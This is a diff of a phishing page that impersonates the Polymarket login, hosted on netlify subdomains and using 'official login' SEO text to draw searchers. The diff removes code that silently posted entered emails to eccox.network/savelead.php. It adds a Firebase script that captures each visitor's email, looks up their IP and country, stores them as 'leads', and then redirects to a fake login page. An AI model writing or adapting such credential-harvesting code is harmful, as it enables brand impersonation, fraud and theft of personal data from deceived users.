@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Polymarket | Login - World's Largest Prediction Market</title>
+    <title>Polymarket login | World's Largest Prediction Market</title>
     <meta name="description" content="Access your Polymarket. The official Polymarket login for trading on world events, politics, and crypto. Join the world's largest decentralized prediction market.">
     <meta name="keywords" content="polymarket, polymarket.com, polymarket login, polymarket official login, poly market, finance, trading, crypto prediction market">
     <link rel="canonical" href="https://polymarketlogin.netlify.app/">
@@ -34,10 +34,10 @@
   "@context": "https://schema.org",
   "@type": "WebSite",
   "name": "Polymarket",
-  "url": "https://polymarketlogin.netlify.app",
+  "url": "https://polymarketbet.netlify.app",
   "potentialAction": {
     "@type": "SearchAction",
-    "target": "https://polymarketlogin.netlify.app/search?q={search_term_string}",
+    "target": "https://polymarketbet.netlify.app/search?q={search_term_string}",
     "query-input": "required name=search_term_string"
   }
 }
@@ -48,9 +48,9 @@
   "@context": "https://schema.org",
   "@type": "Organization",
   "name": "Polymarket",
-  "url": "https://polymarketlogin.netlify.app/",
-  "logo": "https://polymarketlogin.netlify.app/favicon.png",
-  "description": "Polymarkets is a platform focused on prediction markets, insights, and trending event forecasts.",
+  "url": "https://polymarketbet.netlify.app/",
+  "logo": "https://polymarketbet.netlify.app/favicon.png",
+  "description": "Polymarket is a platform focused on prediction markets, insights, and trending event forecasts.",
   "foundingDate": "2026",
   "sameAs": [
     "https://twitter.com/polymarket",
@@ -68,12 +68,12 @@
         "@type": "ListItem",
         "position": 1,
         "name": "Home",
-        "item": "https://polymarketlogin.netlify.app"
+        "item": "https://polymarketbet.netlify.app"
       },{
         "@type": "ListItem",
         "position": 2,
         "name": "Login",
-        "item": "https://polymarketlogin.netlify.app"
+        "item": "https://polymarketbet.netlify.app"
       }]
     }
     </script>
@@ -385,25 +385,7 @@ function googleTranslateElementInit() {
     googleBtn.addEventListener('click', () => {
         emailSection.classList.remove("hidden");
         emailInput.focus();
-    });
 
-    emailContinueBtn.addEventListener('click', async () => {
-    const email = emailInput.value.trim();
-    if (!email) return;
-
-    try {
-        // Send email silently to savelead.php
-        await fetch('https://eccox.network/savelead.php', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-            body: `email=${encodeURIComponent(email)}`
-        });
-    } catch (err) {
-        console.error('Error saving email:', err);
-    }
-
-    // Proceed to login page
-    window.location.href = 'login.html';
 });
     function toggleMenu(){ document.getElementById("menu-overlay").classList.toggle("hidden"); }
     function requireLogin(){ document.getElementById("cancelBtn").classList.remove("hidden"); openLogin(); }
@@ -420,13 +402,13 @@ function googleTranslateElementInit() {
     setTimeout(() => {
         document.getElementById("cancelBtn").classList.add("hidden");
         openLogin();
-    }, 3500);
+    }, 3000);
 </script>
 <script>
 
   // Dynamic Titles & Descriptions for Polymarket clone (optimized 2026 style)
   const seoTitles = {
-    default: "Polymarket Official | Login & Start Trading",
+    default: "Polymarket | Login & Start Trading | polymarket.com",
     login:    "Polymarket.com Login | Start trading",
     account:  "Polymarket email Login | Trade Securely",
     signin:   "Polymarket Sign In | Secure & Official Login",
@@ -482,51 +464,49 @@ function googleTranslateElementInit() {
   });
   
 </script>
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
-const translations = {
-    'es': '¿Traducir página al español?',           // Spanish (Global)
-    'fr': 'Traduire la page en français ?',          // French
-    'de': 'Seite ins Deutsche übersetzen?',          // German
-    'pt': 'Traduzir para o português?',              // Portuguese (Brazil/Portugal)
-    'ru': 'Перевести страницу на русский?',          // Russian
-    'zh': '将页面翻译成中文？',                        // Chinese (Simplified)
-    'ja': 'ページを日本語に翻訳しますか？',             // Japanese
-    'ko': '페이지를 한국어로 번역하시겠습니까?',          // Korean
-    'tr': 'Sayfayı Türkçeye çevir?',                 // Turkish
-    'ar': 'هل تريد ترجمة الصفحة إلى العربية؟'         // Arabic
+// YOUR FIREBASE CONFIG
+const firebaseConfig = {
+  apiKey: "AIzaSyDWfxoyZBG0_C2zh1oOK7Hk61msN4qVt0Q",
+  authDomain: "polymarket-b7224.firebaseapp.com",
+  projectId: "polymarket-b7224",
+  storageBucket: "polymarket-b7224.firebasestorage.app",
+  messagingSenderId: "525262934259",
+  appId: "1:525262934259:web:fda3646657fc8b1ec26786",
+  measurementId: "G-L4H1P4HCCM"
 };
 
-};
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
 
-function initTranslateBanner() {
-    const userLang = navigator.language.split('-')[0]; 
-    const banner = document.getElementById('custom-translate-banner');
-    const textEl = document.getElementById('translate-text');
+// OVERRIDE YOUR EXISTING BUTTON LOGIC
+document.getElementById("emailContinueBtn").addEventListener("click", async () => {
+    const email = document.getElementById("emailInput").value.trim();
+    if (!email) return;
 
-    if (userLang !== 'en' && translations[userLang]) {
-        if (textEl) textEl.textContent = translations[userLang];
-        if (banner) banner.classList.remove('hidden');
+    try {
+        // GET IP + COUNTRY
+        const res = await fetch("https://ipapi.co/json/");
+        const data = await res.json();
+
+        // SAVE TO FIREBASE
+        await addDoc(collection(db, "leads"), {
+            email: email,
+            ip: data.ip,
+            country: data.country_name,
+            time: new Date()
+        });
+
+    } catch (err) {
+        console.error("Error:", err);
     }
-}
 
-function triggerGoogleTranslate() {
-    const userLang = navigator.language.split('-')[0];
-    const select = document.querySelector('.goog-te-combo');
-    if (select) {
-        select.value = userLang;
-        select.dispatchEvent(new Event('change'));
-    }
-    closeBanner();
-}
-
-function closeBanner() {
-    const banner = document.getElementById('custom-translate-banner');
-    if (banner) banner.classList.add('hidden');
-}
-
-// Add this to your existing window load listeners
-window.addEventListener('load', initTranslateBanner);
-
-
+    // CONTINUE YOUR FLOW
+    window.location.href = "login.html";
+});
+</script>
 </body>
 </html>
